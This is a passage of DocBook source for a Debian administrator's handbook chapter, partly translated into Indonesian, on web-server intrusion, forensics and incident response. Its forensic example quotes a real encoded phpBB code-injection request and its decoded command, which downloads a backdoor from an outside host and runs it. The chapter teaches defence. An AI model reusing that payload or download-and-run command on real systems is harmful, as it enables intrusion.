	queries. This allows blocking some attack vectors. For instance,
	limiting the length of parameters can prevent buffer overflows.
	More generally, one can validate parameters before they are even
	passed to the web application and restrict access along many
	criteria. This can even be combined with dynamic firewall updates,
	so that a client infringing one of the rules is banned from
	accessing the web server for a given period of time.</para>

	<para>Mengatur pemeriksaan bisa merupakan tugas yang panjang dan rumit, tapi itu bisa membayar lunas ketika aplikasi web yang digunakan memiliki track record yang meragukan terkait masalah keamanan.</para>

	<para><emphasis>mod-security2</emphasis> (in the <emphasis role="pkg">libapache2-mod-security2</emphasis> package) is the main
        such module. It even comes with many ready-to-use rules of its own
        (in the <emphasis role="pkg">modsecurity-crs</emphasis> package)
        that you can easily enable.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>The consequences of an intrusion will have various levels of
      obviousness depending on the motivations of the attacker.
      <emphasis>Script-kiddies</emphasis> only apply recipes they find on
      web sites; most often, they deface a web page or delete data. In more
      subtle cases, they add invisible contents to web pages so as to
      improve referrals to their own sites in search engines.</para>

      <para>A more advanced attacker will go beyond that. A disaster
      scenario could go on in the following fashion: the attacker gains the
      ability to execute commands as the <literal>www-data</literal> user,
      but executing a command requires many manipulations. To make their
      life easier, they install other web applications specially designed
      to remotely execute many kinds of commands, such as browsing the
      filesystem, examining permissions, uploading or downloading files,
      executing commands, and even provide a network shell. Often, the
      vulnerability will allow running a <command>wget</command> command
      that will download some malware into <filename>/tmp/</filename>, then
      executing it. The malware is often downloaded from a foreign website
      that was previously compromised, in order to cover tracks and make it
      harder to find out the actual origin of the attack.</para>

      <para>At this point, the attacker has enough freedom of movement that
      they often install an IRC <emphasis>bot</emphasis> (a robot that
      connects to an IRC server and can be controlled by this channel).
      This bot is often used to share illegal files (unauthorized copies of
      movies or software, and so on). A determined attacker may want to go
      even further. The <literal>www-data</literal> account does not allow
      full access to the machine, and the attacker will try to obtain
      administrator privileges. Now, this should not be possible, but if
      the web application was not up-to-date, chances are that the kernel
      and other programs are outdated too; this sometimes follows a
      decision from the administrator who, despite knowing about the
      vulnerability, neglected to upgrade the system since there are no
      local users. The attacker can then take advantage of this second
      vulnerability to get root access.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Privilege escalation</title>

	<para>This term covers anything that can be used to obtain more
	permissions than a given user should normally have. The
	<command>sudo</command> program is designed for precisely the
	purpose of giving administrative rights to some users. But the same
	term is also used to describe the act of an attacker exploiting a
	vulnerability to obtain undue rights.</para>
      </sidebar>

      <para>Now the attacker owns the machine; they will usually try to
      keep this privileged access for as long as possible. This involves
      installing a <emphasis>rootkit</emphasis>, a program that will
      replace some components of the system so that the attacker will be
      able to obtain the administrator privileges again at a later time;
      the rootkit also tries hiding its own existence as well as any traces
      of the intrusion. A subverted <command>ps</command> program will omit
      to list some processes, <command>netstat</command> will not list some
      of the active connections, and so on. Using the root permissions, the
      attacker was able to observe the whole system, but didn't find
      important data; so they will try accessing other machines in the
      corporate network. Analyzing the administrator's account and the
      history files, the attacker finds what machines are routinely
      accessed. By replacing <command>sudo</command> or
      <command>ssh</command> with a subverted program, the attacker can
      intercept some of the administrator's passwords, which they will use
      on the detected servers… and the intrusion can propagate from then
      on.</para>

      <para>Ini adalah skenario mimpi buruk yang dapat dicegah dengan beberapa langkah. Beberapa bagian selanjutnya menjelaskan beberapa langkah ini.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Memilih Perangkat Lunak Secara Bijak</title>

      <para>Once the potential security problems are known, they must be
      taken into account at each step of the process of deploying a
      service, especially when choosing the software to install. Many web
      sites, such as <literal>SecurityFocus.com</literal>, keep a list of
      recently-discovered vulnerabilities, which can give an idea of a
      security track record before some particular software is deployed. Of
      course, this information must be balanced against the popularity of
      said software: a more widely-used program is a more tempting target,
      and it will be more closely scrutinized as a consequence. On the
      other hand, a niche program may be full of security holes that never
      get publicized due to a lack of interest in a security audit.</para>

      <sidebar>
        <title><emphasis>KOSAKATA</emphasis> Audit Keamanan</title>

	<para>A security audit is the process of thoroughly reading and
	analyzing the source code of some software, looking for potential
	security vulnerabilities it could contain. Such audits are usually
	proactive and they are conducted to ensure a program meets certain
	security requirements.</para>
      </sidebar>

      <para>In the Free Software world, there is generally ample room for
      choice, and choosing one piece of software over another should be a
      decision based on the criteria that apply locally. More features
      imply an increased risk of a vulnerability hiding in the code; picking
      the most advanced program for a task may actually be
      counter-productive, and a better approach is usually to pick the
      simplest program that meets the requirements.</para>

      <sidebar>
        <title><emphasis>KOSAKATA</emphasis> Zero-day exploit</title>

	<para>Serangan <emphasis>zero-day exploitasi</emphasis> sulit untuk dicegah; istilah ini mencakup kerentanan yang belum diketahui untuk para penulis program.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>Mengelola Mesin Secara Utuh</title>

      <para>Most Linux distributions install by default a number of Unix
      services and many tools. In many cases, these services and tools are
      not required for the actual purposes for which the administrator set
      up the machine. As a general guideline in security matters, unneeded
      software is best uninstalled. Indeed, there is no point in securing an
      FTP server, if a vulnerability in a different, unused service can be
      used to get administrator privileges on the whole machine.</para>

      <para>By the same reasoning, firewalls will often be configured to
      only allow access to services that are meant to be publicly
      accessible.</para>

      <para>Current computers are powerful enough to allow hosting several
      services on the same physical machine. From an economic viewpoint,
      such a possibility is interesting: only one computer to administrate,
      lower energy consumption, and so on. From the security point of view,
      however, such a choice can be a problem. One compromised service can
      bring access to the whole machine, which in turn compromises the
      other services hosted on the same computer. This risk can be
      mitigated by isolating the services. This can be attained either with
      virtualization (each service being hosted in a dedicated virtual
      machine or container), or with AppArmor/SELinux (each service daemon
      having an adequately designed set of permissions).</para>
    </section>
    <section id="sect.users-are-players">
      <title>Pengguna Adalah Pemain</title>

      <para>Discussing security immediately brings to mind protection
      against attacks by anonymous crackers hiding in the Internet jungle;
      but an often-forgotten fact is that risks also come from inside: an
      employee about to leave the company could download sensitive files on
      the important projects and sell them to competitors, a negligent
      salesman could leave their desk without locking their session during
      a meeting with a new prospect, a clumsy user could delete the wrong
      directory by mistake, and so on.</para>

      <para>The response to these risks can involve technical solutions: no
      more than the required permissions should be granted to users, and
      regular backups are a must. But in many cases, the appropriate
      protection is going to involve training users to avoid the
      risks.</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>Paket <emphasis role="pkg">autolog</emphasis> menyediakan suatu program yang secara otomatis memutus pengguna tak aktif setelah suatu masa tunggu yang dapat dikonfigurasi. Itu juga mengizinkan mematikan proses pengguna yang tetap berjalan setelah sesi berakhir, sehingga mencegah pengguna menjalankan daemon.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>Keamanan Fisik</title>

      <para>There is no point in securing the services and networks if the
      computers themselves are not protected. Important data deserve being
      stored on hot-swappable hard disks in RAID arrays, because hard disks
      fail eventually and data availability is a must. But if any pizza
      delivery boy can enter the building, sneak into the server room and
      run away with a few selected hard disks, an important part of
      security is not fulfilled. Who can enter the server room? Is access
      monitored? These questions deserve consideration (and an answer) when
      physical security is being evaluated.</para>

      <para>Keamanan fisik juga mencakup mempertimbangkan risiko kecelakaan seperti kebakaran. Risiko khusus ini adalah apa membenarkan menyimpan cadangan media di bangunan terpisah, atau setidaknya di brankas tahan api.</para>
    </section>
    <section>
      <title>Tanggung Jawab Hukum</title>

      <para>Administrator, sedikit banyak secara implisit, dipercaya oleh pengguna mereka serta pengguna jaringan pada umumnya. Oleh karena itu mereka harus menghindari setiap kelalaian yang bisa dimanfaatkan oleh orang-orang jahat.</para>

      <para>An attacker taking control of your machine then using it as a
      forward base (known as a “relay system”) from which to perform
      other nefarious activities could cause legal trouble for you, since
      the attacked party would initially see the attack coming from your
      system, and therefore consider you as the attacker (or as an
      accomplice). In many cases, the attacker will use your server as a
      relay to send spam, which shouldn't have much impact (except
      potentially registration on black lists that could restrict your
      ability to send legitimate emails), but won't be pleasant
      nevertheless. In other cases, more important trouble can be caused
      from your machine, for instance denial of service attacks. This will
      sometimes induce loss of revenue, since the legitimate services will
      be unavailable and data can be destroyed; sometimes this will also
      imply a real cost, because the attacked party can start legal
      proceedings against you. Rights-holders can sue you if an
      unauthorized copy of a work protected by copyright law is shared from
      your server, as well as other companies compelled by service level
      agreements if they are bound to pay penalties following the attack
      from your machine.</para>

      <para>When these situations occur, claiming innocence is not usually
      enough; at the very least, you will need convincing evidence showing
      suspect activity on your system coming from a given IP address. This
      won't be possible if you neglect the recommendations of this chapter
      and let the attacker obtain access to a privileged account (root, in
      particular) and use it to cover their tracks.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>Dealing with a Compromised Machine</title>

    <para>Despite the best intentions and however carefully designed the
    security policy, an administrator eventually faces an act of hijacking.
    This section provides a few guidelines on how to react when confronted
    with these unfortunate circumstances.</para>
    <section>
      <title>Detecting and Seeing the Cracker's Intrusion</title>

      <para>The first step of reacting to cracking is to be aware of such
      an act. This is not self-evident, especially without an adequate
      monitoring infrastructure.</para>

      <para>Cracking acts are often not detected until they have direct
      consequences on the legitimate services hosted on the machine, such
      as connections slowing down, some users being unable to connect, or
      any other kind of malfunction. Faced with these problems, the
      administrator needs to have a good look at the machine and carefully
      scrutinize what misbehaves. This is usually the time when they
      discover an unusual process, for instance one named
      <literal>apache</literal> instead of the standard
      <literal>/usr/sbin/apache2</literal>. If we follow that example, the
      thing to do is to note its process identifier, and check
      <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see
      what program this process is currently running:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>A program installed under <filename>/var/tmp/</filename> and
      running as the web server? No doubt left, the machine is
      compromised.</para>

      <para>This is only one example, but many other hints can ring the
      administrator's bell:</para>
      <itemizedlist>
        <listitem>
	  <para>an option to a command that no longer works; the version of
	  the software that the command claims to be doesn't match the
	  version that is supposed to be installed according to
	  <command>dpkg</command>;</para>
        </listitem>
        <listitem>
	  <para>a command prompt or a session greeting indicating that the
	  last connection came from an unknown server on another
	  continent;</para>
        </listitem>
        <listitem>
	  <para>errors caused by the <filename>/tmp/</filename> partition
	  being full, which turned out to be full of illegal copies of
	  movies;</para>
        </listitem>
        <listitem>
	  <para>dan seterusnya.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>Putting the Server Off-Line</title>

      <para>In any but the most exotic cases, the cracking comes from the
      network, and the attacker needs a working network to reach their
      targets (access confidential data, share illegal files, hide their
      identity by using the machine as a relay, and so on). Unplugging the
      computer from the network will prevent the attacker from reaching
      these targets, if they haven't managed to do so yet.</para>

      <para>This may only be possible if the server is physically
      accessible. When the server is hosted in a hosting provider's data
      center halfway across the country, or if the server is not accessible
      for any other reason, it's usually a good idea to start by gathering
      some important information (see <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />,
      <xref linkend="sect.forensic-analysis" /> and
      <xref linkend="sect.reconstituting-the-attack-scenario" />), then isolating
      that server as much as possible by shutting down as many services as
      possible (usually, everything but <command>sshd</command>). This case
      is still awkward, since one can't rule out the possibility of the
      attacker having SSH access like the administrator has; this makes it
      harder to “clean” the machines.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>Keeping Everything that Could Be Used as Evidence</title>

      <para>Understanding the attack and/or engaging legal action against
      the attackers requires taking copies of all the important elements;
      this includes the contents of the hard disk, a list of all running
      processes, and a list of all open connections. The contents of the
      RAM could also be used, but it is rarely used in practice.</para>

      <para>In the heat of action, administrators are often tempted to
      perform many checks on the compromised machine; this is usually not a
      good idea. Every command is potentially subverted and can erase
      pieces of evidence. The checks should be restricted to the minimal
      set (<command>netstat -tupan</command> for network connections,
      <command>ps auxf</command> for a list of processes, <command>ls -alR
      /proc/[0-9]*</command> for a little more information on running
      programs), and every performed check should carefully be written
      down.</para>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> Hot analysis</title>

	<para>While it may seem tempting to analyze the system as it runs,
	especially when the server is not physically reachable, this is
	best avoided: quite simply you can't trust the programs currently
	installed on the compromised system. It's quite possible for a
	subverted <command>ps</command> command to hide some processes, or
	for a subverted <command>ls</command> to hide files; sometimes even
	the kernel is compromised!</para>

	<para>If such a hot analysis is still required, care should be
	taken to only use known-good programs. A good way to do that would
	be to have a rescue CD with pristine programs, or a read-only
	network share. However, even those countermeasures may not be
	enough if the kernel itself is compromised.</para>
      </sidebar>

      <para>Once the “dynamic” elements have been saved, the next step
      is to store a complete image of the hard-disk. Making such an image
      is impossible if the filesystem is still evolving, which is why it
      must be remounted read-only. The simplest solution is often to halt
      the server brutally (after running <command>sync</command>) and
      reboot it on a rescue CD. Each partition should be copied with a tool
      such as <command>dd</command>; these images can be sent to another
      server (possibly with the very convenient <command>nc</command>
      tool). Another possibility may be even simpler: just get the disk out
      of the machine and replace it with a new one that can be reformatted
      and reinstalled.</para>
    </section>
    <section>
      <title>Re-installing</title>
      <indexterm><primary>backdoor</primary></indexterm>

      <para>The server should not be brought back on line without a
      complete reinstallation. If the compromise was severe (if
      administrative privileges were obtained), there is almost no other
      way to be sure that we get rid of everything the attacker may have
      left behind (particularly <emphasis>backdoors</emphasis>). Of course,
      all the latest security updates must also be applied so as to plug
      the vulnerability used by the attacker. Ideally, analyzing the attack
      should point at this attack vector, so one can be sure of actually
      fixing it; otherwise, one can only hope that the vulnerability was
      one of those fixed by the updates.</para>

      <para>Reinstalling a remote server is not always easy; it may involve
      assistance from the hosting company, because not all such companies
      provide automated reinstallation systems. Care should be taken not to
      reinstall the machine from backups taken later than the compromise.
      Ideally, only data should be restored, the actual software should be
      reinstalled from the installation media.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>Analisis Forensik</title>

      <para>Now that the service has been restored, it is time to have a
      closer look at the disk images of the compromised system in order to
      understand the attack vector. When mounting these images, care should
      be taken to use the <literal>ro,nodev,noexec,noatime</literal>
      options so as to avoid changing the contents (including timestamps of
      access to files) or running compromised programs by mistake.</para>

      <para>Retracing an attack scenario usually involves looking for
      everything that was modified and executed:</para>
      <itemizedlist>
        <listitem>
	  <para><filename>.bash_history</filename> files often provide for
	  a very interesting read;</para>
        </listitem>
        <listitem>
	  <para>so does listing files that were recently created, modified
	  or accessed;</para>
        </listitem>
        <listitem>
	  <para>the <command>strings</command> command helps identifying
	  programs installed by the attacker, by extracting text strings
	  from a binary;</para>
        </listitem>
        <listitem>
	  <para>the log files in <filename>/var/log/</filename> often allow
	  reconstructing a chronology of events;</para>
        </listitem>
        <listitem>
	  <para>special-purpose tools also allow restoring the contents of
	  potentially deleted files, including log files that attackers
	  often delete.</para>
        </listitem>
      </itemizedlist>

      <para>
        Some of these operations can be made easier with specialized
        software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
        package provides many tools to analyze a filesystem. Their use is
        made easier by the <emphasis>Autopsy Forensic Browser</emphasis>
        graphical interface (in the <emphasis role="pkg">autopsy</emphasis> package).
      </para>
      <indexterm><primary>Peramban Forensik Autopsy</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>Reconstituting the Attack Scenario</title>

      <para>All the elements collected during the analysis should fit
      together like pieces in a jigsaw puzzle; the creation of the first
      suspect files is often correlated with logs proving the breach. A
      real-world example should be more explicit than long theoretical
      ramblings.</para>

      <para>The following log is an extract from an Apache
      <filename>access.log</filename>:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>
        This example matches exploitation of an old security
        vulnerability in phpBB.
        <ulink type="block" url="http://secunia.com/advisories/13239/" />
        <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" />
      </para>

      <para>Decoding this long URL leads to understanding that the attacker
      managed to run some PHP code, namely: <command>system("cd /tmp; wget
      gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd;
      chmod +x bd; ./bd &amp;")</command>. Indeed, a
      <filename>bd</filename> file was found in <filename>/tmp/</filename>.
      Running <command>strings /mnt/tmp/bd</command> returns, among other
      strings, <literal>PsychoPhobia Backdoor is starting...</literal>.
      This really looks like a backdoor.</para>

      <para>Some time later, this access was used to download, install and
      run an IRC <emphasis>bot</emphasis> that connected to an underground
      IRC network. The bot could then be controlled via this protocol and
      instructed to download files for sharing. This program even has its
      own log file:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>These traces show that two video files have been stored on the
      server by way of the 82.50.72.202 IP address.</para>

      <para>In parallel, the attacker also downloaded a pair of extra
      files, <filename>/tmp/pt</filename> and
      <filename>/tmp/loginx</filename>. Running these files through
      <command>strings</command> leads to strings such as
      <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> and
      <foreignphrase>Now wait for suid shell...</foreignphrase>. These look
      like programs exploiting local vulnerabilities to obtain
      administrative privileges. Did they reach their target? In this case,
      probably not, since no files seem to have been modified after the
      initial breach.</para>

      <para>In this example, the whole intrusion has been reconstructed,
      and it can be deduced that the attacker has been able to take
      advantage of the compromised system for about three days; but the
      most important element in the analysis is that the vulnerability has
      been identified, and the administrator can be sure that the new
      installation really does fix the vulnerability.</para>
    </section>
  </section>
</chapter>
